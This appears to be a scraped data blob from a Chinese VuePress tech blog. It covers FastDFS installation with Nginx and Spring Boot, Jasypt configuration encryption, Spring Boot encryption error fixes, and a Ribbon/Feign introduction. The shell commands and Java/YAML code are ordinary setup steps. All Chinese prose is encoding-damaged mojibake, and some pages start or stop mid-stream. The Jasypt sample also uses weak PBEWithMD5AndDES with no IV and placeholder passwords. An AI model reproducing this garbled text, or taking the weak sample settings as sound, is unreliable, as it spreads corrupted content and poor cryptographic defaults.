28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\nä¿®æ¹å¦ä¸æä»¶\n\nvi /usr/libexec/urlgrabber-ext-down\n#æç¬¬ä¸è¡ç\n#!/usr/bin/python\n\n#ä¿®æ¹ä¸ºï¼ç¶åéæ°å®è£\n#!/usr/bin/python2\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# ç£çç®å½\n\nè¯´æ                  ä½ç½®\nææå®è£å               /home/dfs/lib\næ°æ®å­å¨ä½ç½®              /home/dfs/store\nè¿éæä¸ºäºæ¹ä¾¿ææ¥å¿ä»ä¹çé½æ¾å°äº   /home/dfs/log\n\n\n# å®è£ libfastcommon\n\ngit clone https://github.com/happyfish100/libfastcommon.git --depth 1\ncd libfastcommon/\n./make.sh && ./make.sh install #ç¼è¯å®è£\n\n\n1\n2\n3\n\n\n\n# å®è£ fastdfs\n\ncd ../ #è¿åä¸ä¸çº§ç®å½\ngit clone https://github.com/happyfish100/fastdfs.git --depth 1\ncd fastdfs/\n./make.sh && ./make.sh install #ç¼è¯å®è£\n#éç½®æä»¶åå¤\ncp /etc/fdfs/tracker.conf.sample /etc/fdfs/tracker.conf\ncp /etc/fdfs/storage.conf.sample /etc/fdfs/storage.conf\ncp /etc/fdfs/client.conf.sample /etc/fdfs/client.conf #å®¢æ·ç«¯æä»¶ï¼æµè¯ç¨\ncp /home/dfs/lib/fastdfs/conf/http.conf /etc/fdfs/ #ä¾nginxè®¿é®ä½¿ç¨\ncp /home/dfs/lib/fastdfs/conf/mime.types /etc/fdfs/ #ä¾nginxè®¿é®ä½¿ç¨\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# å®è£ fastdfs-nginx-module\n\ncd ../ #è¿åä¸ä¸çº§ç®å½\ngit clone https://github.com/happyfish100/fastdfs-nginx-module.git --depth 1\ncp /home/dfs/lib/fastdfs-nginx-module/src/mod_fastdfs.conf /etc/fdfs\n\n\n1\n2\n3\n\n\néå nginx ä½¿ç¨ï¼å³äº nginx å®è£è¿éå°±ä¸è¯´äºï¼å®è£å nginx éè¦éç½®å¦ä¸ï¼\n\n./configure --prefix=/home/nginx-1.18.0 --add-module=/home/dfs/lib/fastdfs-nginx-module/src\n\n\n1\n\n\n\n# åæºé¨ç½²\n\n\n# tracker éç½®\n\n#æå¡å¨ipä¸º 10.24x.3x.xx2\n#æå»ºè®®ç¨ftpä¸è½½ä¸æ¥è¿äºæä»¶ æ¬å°ä¿®æ¹\nvim /etc/fdfs/tracker.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nport=22122  # trackeræå¡å¨ç«¯å£ï¼é»è®¤22122,ä¸è¬ä¸ä¿®æ¹ï¼\nbase_path=/home/dfs/log  # å­å¨æ¥å¿åæ°æ®çæ ¹ç®å½\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# storage éç½®\n\nvim /etc/fdfs/storage.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nport=23000  # storageæå¡ç«¯å£ï¼é»è®¤23000,ä¸è¬ä¸ä¿®æ¹ï¼\nbase_path=/home/dfs/log  # æ°æ®åæ¥å¿æä»¶å­å¨æ ¹ç®å½\nstore_path0=/home/dfs/store  # ç¬¬ä¸ä¸ªå­å¨ç®å½\ntracker_server=10.24x.3x.xx2:22122  # trackeræå¡å¨ipåç«¯å£\nhttp.server_port=8888  # httpè®¿é®æä»¶çç«¯å£(é»è®¤8888,çæåµä¿®æ¹,ånginxä¸­ä¿æä¸è´)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# å¯å¨\n\n# tracker\n\n/etc/init.d/fdfs_trackerd start #å¯å¨trackeræå¡\n/etc/init.d/fdfs_trackerd restart #éå¯å¨trackeræå¡\n/etc/init.d/fdfs_trackerd stop #åæ­¢trackeræå¡\nchkconfig fdfs_trackerd on #èªå¯å¨trackeræå¡\n\n\n1\n2\n3\n4\n\n\n# storage\n\n/etc/init.d/fdfs_storaged start #å¯å¨storageæå¡\n/etc/init.d/fdfs_storaged restart #éå¨storageæå¡\n/etc/init.d/fdfs_storaged stop #åæ­¢å¨storageæå¡\nchkconfig fdfs_storaged on #èªå¯å¨storageæå¡\n\n\n1\n2\n3\n4\n\n\n\n# client æµè¯\n\nè¿å groupx ææå°±æ¯æåäºï¼æä»¶è¢«éæ°æ¹åå­å¹¶ä¸è¢«æ¾å¨äºæä¸ªå°æ¹\n\nvim /etc/fdfs/client.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nbase_path=/home/dfs/log\ntracker_server=10.24x.3x.xx2:22122    #trackeræå¡å¨ipåç«¯å£\n\n[root@node102 home]# fdfs_upload_file /etc/fdfs/client.conf /home/start.sh \ngroup1/m00/00/00/cvaezl_r4usafhxsaaacuytz3no8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nä¸ç¥éå¯ä»¥ç¨ä»¥ä¸å½ä»¤æ¥ææ¾\n\n[root@node102 home]# find / -name cvaezl_r4usafhxsaaacuytz3no8807.sh\n/home/dfs/store/data/00/00/cvaezl_r4usafhxsaaacuytz3no8807.sh\n\n\n1\n2\n\n\n\n# nginx éç½®è®¿é®\n\nvim /etc/fdfs/mod_fastdfs.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\ntracker_server=10.24x.3x.xx2:22122  #trackeræå¡å¨ipåç«¯å£\nurl_have_group_name=true\nstore_path0=/home/dfs/store\n#éç½®nginx.config\nvim /home/nginx-1.18.0/conf/nginx.conf\n#æ·»å å¦ä¸éç½®\nserver {\n    listen       8888;    ## è¯¥ç«¯å£ä¸ºstorage.confä¸­çhttp.server_portç¸å\n    server_name  localhost;\n    location ~/group[0-9]/ {\n        ngx_fastdfs_module;\n    }\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n    root   html;\n    }\n}\n# åæ8888ç«¯å£æå¼\n/sbin/iptables -i input -p tcp --dport 8888 -j accept\n#æµè¯ä¸è½½ï¼ç¨å¤é¨æµè§å¨è®¿é®åæå·²ä¼ è¿çnginxå®è£å,å¼ç¨è¿åçid\nhttp://10.24x.3x.xx2:8888/group1/m00/00/00/cvaezl_r4usafhxsaaacuytz3no8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nå¦æ nginx å¯å¨ unknown directive "ngx_fastdfs_module"ï¼åæ¯å®è£ nginx --add-module=/home/dfs/lib/fastdfs-nginx-module/src å¤±è´¥ï¼å¯ä»¥ç¨./nginx -v æ¥çã\n\n[root@node102 sbin]# ./nginx -v\nnginx version: nginx/1.18.0\nbuilt by gcc 9.3.1 20200408 (red hat 9.3.1-2) (gcc) \nbuilt with openssl 1.0.2k-fips  26 jan 2017\ntls sni support enabled\nconfigure arguments: --add-module=/home/dfs/lib/fastdfs-nginx-module/src --prefix=/home/nginx-1.18.0 --with-http_stub_status_module --with-http_ssl_module --with-http_v2_module --with-pcre=/home/pcre-8.35\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# åå¸å¼é¨ç½²\n\n\n# storage éç½®\n\ntracker éç½® ååæºé¨ç½²æ¯ä¸æ ·çä¸åï¼åªéè¦æ¹å storage éç½®\n\nvim /etc/fdfs/storage.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nport=23000  # storageæå¡ç«¯å£ï¼é»è®¤23000,ä¸è¬ä¸ä¿®æ¹ï¼\nbase_path=/home/dfs/log  # æ°æ®åæ¥å¿æä»¶å­å¨æ ¹ç®å½\nstore_path0=/home/dfs/store  # ç¬¬ä¸ä¸ªå­å¨ç®å½\ntracker_server=10.240.3x.xx0:22122  # æå¡å¨1\ntracker_server=10.240.3x.xx1:22122  # æå¡å¨2\ntracker_server=10.240.3x.xx2:22122  # æå¡å¨3\nhttp.server_port=8888  # httpè®¿é®æä»¶çç«¯å£(é»è®¤8888,çæåµä¿®æ¹,ånginxä¸­ä¿æä¸è´)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# client æµè¯\n\nvim /etc/fdfs/client.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nbase_path=/home/moe/dfs\ntracker_server=10.240.3x.xx0:22122  # æå¡å¨1\ntracker_server=10.240.3x.xx1:22122  # æå¡å¨2\ntracker_server=10.240.3x.xx2:22122  # æå¡å¨3\n# ä¿å­éåº\n\n[root@node102 home]# fdfs_upload_file /etc/fdfs/client.conf /home/start.sh \ngroup1/m00/00/00/cvaezl_r4usafhxsaaacuytz3no8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# éç½® nginx è®¿é®\n\nvim /etc/fdfs/mod_fastdfs.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\ntracker_server=10.240.3x.xx0:22122  # æå¡å¨1\ntracker_server=10.240.3x.xx1:22122  # æå¡å¨2\ntracker_server=10.240.3x.xx2:22122  # æå¡å¨3\nurl_have_group_name=true\nstore_path0=/home/dfs/store\n#éç½®nginx.config\nvim /home/nginx-1.18.0/conf/nginx.conf\n#æ·»å å¦ä¸éç½®\nserver {\n    listen       8888;    ## è¯¥ç«¯å£ä¸ºstorage.confä¸­çhttp.server_portç¸å\n    server_name  localhost;\n    location ~/group[0-9]/ {\n        ngx_fastdfs_module;\n    }\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n    root   html;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# éæ springboot\n\n\n# å¼å¥ä¾èµ\n\n<dependency>\n    <groupid>com.github.tobato</groupid>\n    <artifactid>fastdfs-client</artifactid>\n    <version>1.26.7</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n\n# æ·»å éç½®\n\nfdfs:\n  # è¿æ¥çè¶æ¶æ¶é´\n  connect-timeout: 3000\n  # è¯»åçè¶æ¶æ¶é´\n  so-timeout: 3000\n  #trackeræå¡æå¨çipå°ååç«¯å£å·\n  tracker-list: 10.240.3x.xx2:22122\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# controller\n\n@restcontroller\n@requestmapping("/img")\npublic class imgcontroller {\n\n    @autowired\n    private imgserver imgserver;\n\n    @postmapping("/push")\n    public responsedata push(@requestparam("file") multipartfile file){\n        return imgserver.push(file);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# å®ç°\n\n@service\n@slf4j\npublic class imgserverimpl implements imgserver {\n    @autowired\n    fastfilestorageclient fastfilestorageclient;\n\n    @override\n    public responsedata<string> push(multipartfile file) {\n        if (file.isempty()) {\n            return responsedata.failureresponse(uploadfilecode.upload_file_code_1000);\n        }\n        try {\n            log.info("å¼å§ä¸ä¼  {}", file.getoriginalfilename());\n            string filesuffix = file.getoriginalfilename().substring(file.getoriginalfilename().lastindexof(".")+1);\n            storepath storepath = fastfilestorageclient.uploadfile(file.getinputstream(), file.getsize(),filesuffix, null);\n            string path = storepath.getfullpath();\n            log.info("ä¸ä¼ æå");\n            return responsedata.successresponse(path);\n        } catch (ioexception e) {\n            log.error(e.tostring(), e);\n            return responsedata.failureresponse(uploadfilecode.upload_file_code_1001.getcode(), e.tostring());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n',charsets:{cjk:!0}},{title:"Spring Boot éæ Jasypt 3.0.3 éç½®æä»¶å å¯",frontmatter:{title:"Spring Boot éæ Jasypt 3.0.3 éç½®æä»¶å å¯",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/205/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/03.spring%20boot/205.Spring%20Boot%20%E9%9B%86%E6%88%90%20Jasypt%203.0.3%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8A%A0%E5%AF%86.html",relativePath:"01.æ¡æ¶/01.Spring/03.spring boot/205.Spring Boot éæ Jasypt 3.0.3 éç½®æä»¶å å¯.md",key:"v-2c7a2efa",path:"/spring/spring-boot/205/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'ä¾èµ\n\n<dependency>\n    <groupId>com.github.ulisesbocchio</groupId>\n    <artifactId>jasypt-spring-boot-starter</artifactId>\n    <version>3.0.3</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\nyml ä¸­æ·»å éç½®æä»¶\n\njasypt:\n  encryptor:\n    # çå å¯\n    password: aabbcc\n    # æå®å å¯æ¹å¼\n    algorithm: PBEWithMD5AndDES\n    iv-generator-classname: org.jasypt.iv.NoIvGenerator\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nè¾åºå å¯å¯ç å·¥å·ç±»\n\npackage com.aa.cloud.util;\n\nimport org.jasypt.encryption.pbe.PooledPBEStringEncryptor;\nimport org.jasypt.encryption.pbe.config.SimpleStringPBEConfig;\n\n/**\n * @author big uncle\n * @date 2020/11/23 14:23\n * @module\n **/\npublic class JasyptUtil {\n\n\n    /**\n     * Jasyptçæå å¯ç»æ\n     * @param password éç½®æä»¶ä¸­è®¾å®çå å¯çå¼\n     * @param value å å¯å¼\n     * @return\n     */\n    public static String encyptPwd(String password,String value){\n        PooledPBEStringEncryptor encryptor = new PooledPBEStringEncryptor();\n        encryptor.setConfig(cryptor(password));\n        String result = encryptor.encrypt(value);\n        return result;\n    }\n\n    /**\n     * è§£å¯\n     * @param password éç½®æä»¶ä¸­è®¾å®çå å¯çå¼\n     * @param value è§£å¯å¯æ\n     * @return\n     */\n    public static String decyptPwd(String password,String value){\n        PooledPBEStringEncryptor encryptor = new PooledPBEStringEncryptor();\n        encryptor.setConfig(cryptor(password));\n        String result = encryptor.decrypt(value);\n        return result;\n    }\n\n    public static SimpleStringPBEConfig cryptor(String password){\n        SimpleStringPBEConfig config = new SimpleStringPBEConfig();\n        config.setPassword(password);\n        config.setAlgorithm("PBEWithMD5AndDES");\n        config.setKeyObtentionIterations("1000");\n        config.setPoolSize("1");\n        config.setProviderName("SunJCE");\n        config.setSaltGeneratorClassName("org.jasypt.salt.RandomSaltGenerator");\n        config.setStringOutputType("base64");\n        return config;\n    }\n\n\n    public static void main(String[] args) {\n        // å å¯\n        String encPwd = encyptPwd("giant", "mysql");\n        // è§£å¯\n        String decPwd = decyptPwd("giant", encPwd);\n        System.out.println(encPwd);\n        System.out.println(decPwd);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\nå¾å°å å¯å¯ç è¿è¡æ¿æ¢\n\n  redis:\n    host: 192.168.81.101\n    password: ENC(u1itOZa4Xt3qMyG1VJGa9fc0wDUaQ59/)\n    database: 0\n    port: 26379\n    timeout: 10000\n    sentinel:\n      nodes:\n        - 192.168.81.101:26379\n        - 192.168.81.102:26379\n      password: ENC(1iyE4/wqjqSHmFKKVVpLAg==)\n      master: mymaster\n      enable: true\n    lettuce:\n      pool:\n        max-wait: 10000\n        max-active: 30\n        max-idle: 15\n        min-idle: 15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nå»ºè®®é¨ç½²çæ¶å ç ä¸è¦æ¾å°éç½®æä»¶ï¼å¯ä»¥ç¨å¯å¨åæ° -Djasypt.encryptor.password=aabbcc æ¥æ¿ä»£ã',normalizedContent:'ä¾èµ\n\n<dependency>\n    <groupid>com.github.ulisesbocchio</groupid>\n    <artifactid>jasypt-spring-boot-starter</artifactid>\n    <version>3.0.3</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\nyml ä¸­æ·»å éç½®æä»¶\n\njasypt:\n  encryptor:\n    # çå å¯\n    password: aabbcc\n    # æå®å å¯æ¹å¼\n    algorithm: pbewithmd5anddes\n    iv-generator-classname: org.jasypt.iv.noivgenerator\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nè¾åºå å¯å¯ç å·¥å·ç±»\n\npackage com.aa.cloud.util;\n\nimport org.jasypt.encryption.pbe.pooledpbestringencryptor;\nimport org.jasypt.encryption.pbe.config.simplestringpbeconfig;\n\n/**\n * @author big uncle\n * @date 2020/11/23 14:23\n * @module\n **/\npublic class jasyptutil {\n\n\n    /**\n     * jasyptçæå å¯ç»æ\n     * @param password éç½®æä»¶ä¸­è®¾å®çå å¯çå¼\n     * @param value å å¯å¼\n     * @return\n     */\n    public static string encyptpwd(string password,string value){\n        pooledpbestringencryptor encryptor = new pooledpbestringencryptor();\n        encryptor.setconfig(cryptor(password));\n        string result = encryptor.encrypt(value);\n        return result;\n    }\n\n    /**\n     * è§£å¯\n     * @param password éç½®æä»¶ä¸­è®¾å®çå å¯çå¼\n     * @param value è§£å¯å¯æ\n     * @return\n     */\n    public static string decyptpwd(string password,string value){\n        pooledpbestringencryptor encryptor = new pooledpbestringencryptor();\n        encryptor.setconfig(cryptor(password));\n        string result = encryptor.decrypt(value);\n        return result;\n    }\n\n    public static simplestringpbeconfig cryptor(string password){\n        simplestringpbeconfig config = new simplestringpbeconfig();\n        config.setpassword(password);\n        config.setalgorithm("pbewithmd5anddes");\n        config.setkeyobtentioniterations("1000");\n        config.setpoolsize("1");\n        config.setprovidername("sunjce");\n        config.setsaltgeneratorclassname("org.jasypt.salt.randomsaltgenerator");\n        config.setstringoutputtype("base64");\n        return config;\n    }\n\n\n    public static void main(string[] args) {\n        // å å¯\n        string encpwd = encyptpwd("giant", "mysql");\n        // è§£å¯\n        string decpwd = decyptpwd("giant", encpwd);\n        system.out.println(encpwd);\n        system.out.println(decpwd);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\nå¾å°å å¯å¯ç è¿è¡æ¿æ¢\n\n  redis:\n    host: 192.168.81.101\n    password: enc(u1itoza4xt3qmyg1vjga9fc0wduaq59/)\n    database: 0\n    port: 26379\n    timeout: 10000\n    sentinel:\n      nodes:\n        - 192.168.81.101:26379\n        - 192.168.81.102:26379\n      password: enc(1iye4/wqjqshmfkkvvplag==)\n      master: mymaster\n      enable: true\n    lettuce:\n      pool:\n        max-wait: 10000\n        max-active: 30\n        max-idle: 15\n        min-idle: 15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nå»ºè®®é¨ç½²çæ¶å ç ä¸è¦æ¾å°éç½®æä»¶ï¼å¯ä»¥ç¨å¯å¨åæ° -djasypt.encryptor.password=aabbcc æ¥æ¿ä»£ã',charsets:{cjk:!0}},{title:"Spring Boot VUEååç«¯å è§£å¯",frontmatter:{title:"Spring Boot VUEååç«¯å è§£å¯",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/207/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/03.spring%20boot/207.Spring%20Boot%20VUE%E5%89%8D%E5%90%8E%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86.html",relativePath:"01.æ¡æ¶/01.Spring/03.spring boot/207.Spring Boot VUEååç«¯å è§£å¯.md",key:"v-6b4bcf80",path:"/spring/spring-boot/207/",headers:[{level:2,title:"Malformed UTF-8 data",slug:"malformed-utf-8-data",normalizedTitle:"malformed utf-8 data",charIndex:2},{level:2,title:"ecurityException: JCE cannot authenticate the provider BC",slug:"ecurityexception-jce-cannot-authenticate-the-provider-bc",normalizedTitle:"ecurityexception: jce cannot authenticate the provider bc",charIndex:309}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Malformed UTF-8 data ecurityException: JCE cannot authenticate the provider BC",content:'# Malformed UTF-8 data\n\næ´ä¸ªé®é¢è¿æ¯æ¯è¾å¥æªçï¼å¨ idea è¿è¡çæ¶åæ²¡æé®é¢ï¼æåç«¯æåçæä»¶æ¾å°åç«¯æ´åå¹¶ææ jar ååå°±åºç°äºï¼æ¾å°ä¸ç¯ææ¡£è¯´æ¯å¯å¨ jar çæ¶åå å¥ -Dfile.encoding=UTF-8 å³å¯\n\njava "-Dfile.encoding=UTF-8" -jar tool-boot-0.0.1-SNAPSHOT.jar\n\n\n1\n\n\nä½å¦æä½ æ¯ tomcatï¼éè¦å¨ catalina.bat ä¸­è®¾ç½®\n\nset "JAVA_OPTS=%JAVA_OPTS% %LOGGING_CONFIG% -Dfile.encoding=UTF-8"\n\n\n1\n\n\n\n# ecurityException: JCE cannot authenticate the provider BC\n\nåºç°è¿ééè¯¯æ¯ç±äº jdk éªç­¾é®é¢ï¼oracle ç jdk å¤§é¨åäººåç¨ï¼ä½æ¯ç°å¨æ´æ¨è openjdkï¼æ¢æ openjdk å°±ä¸ä¼ååºç°è¿ç±»é®é¢',normalizedContent:'# malformed utf-8 data\n\næ´ä¸ªé®é¢è¿æ¯æ¯è¾å¥æªçï¼å¨ idea è¿è¡çæ¶åæ²¡æé®é¢ï¼æåç«¯æåçæä»¶æ¾å°åç«¯æ´åå¹¶ææ jar ååå°±åºç°äºï¼æ¾å°ä¸ç¯ææ¡£è¯´æ¯å¯å¨ jar çæ¶åå å¥ -dfile.encoding=utf-8 å³å¯\n\njava "-dfile.encoding=utf-8" -jar tool-boot-0.0.1-snapshot.jar\n\n\n1\n\n\nä½å¦æä½ æ¯ tomcatï¼éè¦å¨ catalina.bat ä¸­è®¾ç½®\n\nset "java_opts=%java_opts% %logging_config% -dfile.encoding=utf-8"\n\n\n1\n\n\n\n# ecurityexception: jce cannot authenticate the provider bc\n\nåºç°è¿ééè¯¯æ¯ç±äº jdk éªç­¾é®é¢ï¼oracle ç jdk å¤§é¨åäººåç¨ï¼ä½æ¯ç°å¨æ´æ¨è openjdkï¼æ¢æ openjdk å°±ä¸ä¼ååºç°è¿ç±»é®é¢',charsets:{cjk:!0}},{title:"SpringCloud ä¹ RibbonåFeign",frontmatter:{title:"SpringCloud ä¹ RibbonåFeign",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-cloud/1/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/04.spring%20cloud/1.SpringCloud%20%E4%B9%8B%20Ribbon%E5%92%8CFeign.html",relativePath:"01.æ¡æ¶/01.Spring/04.spring cloud/1.SpringCloud ä¹ RibbonåFeign.md",key:"v-1acf6d1d",path:"/spring/spring-cloud/1/",headers:[{level:2,title:"Ribbon",slug:"ribbon",normalizedTitle:"ribbon",charIndex:2},{level:3,title:"ä¸ãå¯¹æ¯",slug:"ä¸ãå¯¹æ¯",normalizedTitle:"ä¸ãå¯¹æ¯",charIndex:13},{level:3,title:"äºãå¼å",slug:"äºãå¼å",normalizedTitle:"äºãå¼å",charIndex:281},{level:2,title:"Feign",slug:"feign",normalizedTitle:"feign",charIndex:2071},{level:3,title:"feginç®ä»",slug:"feginç®ä»",normalizedTitle:"fegin ç®ä»",charIndex:2081},{level:3,title:"ä½¿ç¨",slug:"ä½¿ç¨",normalizedTitle:"ä½¿ç¨",charIndex:877},{level:3,title:"Feignå¯¹åç¼©çæ¯æ",slug:"feignå¯¹åç¼©çæ¯æ",normalizedTitle:"feign å¯¹åç¼©çæ¯æ",charIndex:3638},{level:3,title:"feignå¯¹OkHttpçæ¯æ",slug:"feignå¯¹okhttpçæ¯æ",normalizedTitle:"feign å¯¹ okhttp çæ¯æ",charIndex:4038},{level:3,title:"äºãæ¥å¿",slug:"äºãæ¥å¿",normalizedTitle:"äºãæ¥å¿",charIndex:6272},{level:3,title:"Feignçå¨å±å¼å¸¸å¤ç",slug:"feignçå¨å±å¼å¸¸å¤ç",normalizedTitle:"feign çå¨å±å¼å¸¸å¤ç",charIndex:16721}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Ribbon ä¸ãå¯¹æ¯ äºãå¼å Feign feginç®ä» ä½¿ç¨ Feignå¯¹åç¼©çæ¯æ feignå¯¹OkHttpçæ¯æ äºãæ¥å¿ Feignçå¨å±å¼å¸¸å¤ç",content:'# Ribbon\n\n\n# ä¸ãå¯¹æ¯\n\nRPC\n\n * è¿ç¨è¿ç¨è°ç¨ï¼åè°ç¨æ¬å°æ¹æ³ä¸æ ·è°ç¨æå¡å¨çæå¡\n * æ¯æåæ­¥æå¼æ­¥\n * å®¢æ·ç«¯åæå¡å¨ä¹é´å»ºç« TCP è¿æ¥ï¼å¯ä»¥ä¸æ¬¡å»ºç«ä¸ä¸ªï¼ä¹å¯ä»¥å¤ä¸ªè°ç¨å¤ç¨ä¸æ¬¡è¿æ¥\n * RPC æ°æ®åå° (è°·æ­ protobuf ä»¥äºè¿å¶æ¹å¼ä¼ è¾)\n * æ¯è¾å¤æè¦è¿è¡ï¼ç¼ç ï¼è§£ç ï¼åºååï¼è¿æ¥ï¼ä¸¢åï¼æåï¼ç»åï¼åè®®å¶å®\n   Rest (HTTP)\n * HTTP è¯·æ±ï¼æ¯æå¤ç§åè®®ååè½\n * å¼åæ¹ä¾¿ææ¬ä½\n * http æ°æ®åå¤§\n * java å¼åï¼HttpClient URLConnection\n\n\n# äºãå¼å\n\nå¼å¥ä¾èµ\n\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-netflix-ribbon</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n\n\nå¨ application ç§éç½®\n\n    @Bean\n    @LoadBalanced\n    public RestTemplate restTemplate(){\n        return new RestTemplate();\n    }\n\n\n1\n2\n3\n4\n5\n\n\nä¿®è´è½½åè¡¡æ¹ç­ç¥\n\n    /**\n     * åè½æè¿°: è´è½½åè¡¡ç­ç¥\n     * RoundRobinRule:è½®è¯¢\n     * RandomRule:éæº\n     * AvailabilityFilteringRule: ä¼åè¿æ»¤æç±äºå¤æ¬¡è®¿é®æéèå¤äºæ­è·¯å¨è·³é¸ç¶æçæå¡,ä»¥åå¹¶åçè¿æ¥æ°é\n     * è¶è¿éå¼çæå¡,ç¶åå¯¹å©ä½çæå¡åè¡¨æç§è½®è¯¢ç­ç¥è¿è¡è®¿é®;\n     * WeightedResponseTimeRule: æ ¹æ®å¹³åååºæ¶é´è®¡ç®æææå¡çæé,ååºæ¶é´è¶å¿«,æå¡æéè¶å¤§,è¢«éä¸­çæºçè¶é«;\n     * åå¯å¨æ¶,å¦æç»è®¡ä¿¡æ¯ä¸è¶³,åä½¿ç¨RoundRobinRuleç­ç¥,ç­ç»è®¡ä¿¡æ¯è¶³å¤æ¶,ä¼åæ¢å°WeightedResponseTimeRule\n     * RetryRule: åæç§RoundRobinRuleçç­ç¥è·åæå¡,å¦æè·åæå¡å¤±è´¥,åå¨æå®æ¶é´åä¼è¿è¡éè¯,è·åå¯ç¨çæå¡;\n     * BestAvailableRule: ä¼åè¿æ»¤æç±äºå¤æ¬¡è®¿é®æéèå¤äºæ­è·¯å¨è·³é¸ç¶æçæå¡,ç¶åéæ©ä¸ä¸ªå¹¶åéæå°çæå¡;\n     * ZoneAvoidanceRule: é»è®¤è§å,å¤åå¤æ­serveræå¨åºåçæ§è½åserverçå¯ç¨æ§éæ©æå¡å¨;\n     * @return : com.netflix.loadbalancer.IRule\n     * @author : big uncle\n     * @date : 2019/9/7 14:07\n     */\n    @Bean\n    public IRule myRule(){\n        //èªå®ä¹åè¡¡ç­ç¥\n        return new RandomRule();\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nå®éè°ç¨\n\n/**\n* è®¢åæ¶è´¹æå¡\n* @author shengwu ni\n*/\n@RestController\n@RequestMapping("/consumer/order")\npublic class OrderConsumerController {\n\n   /**\n    * è®¢åæå¡æä¾èæ¨¡åç url åç¼\n    */\n//    private static final String ORDER_PROVIDER_URL_PREFIX = "http://localhost:8001";\n   private static final String ORDER_PROVIDER_URL_PREFIX = "http://MICROSERVICE-ORDER";\n\n   @Resource\n   private RestTemplate restTemplate;\n\n   @GetMapping("/get/{id}")\n   public TOrder getOrder(@PathVariable Long id) {\n\n       return restTemplate.getForObject(ORDER_PROVIDER_URL_PREFIX + "/provider/order/get/" + id, TOrder.class);\n   }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 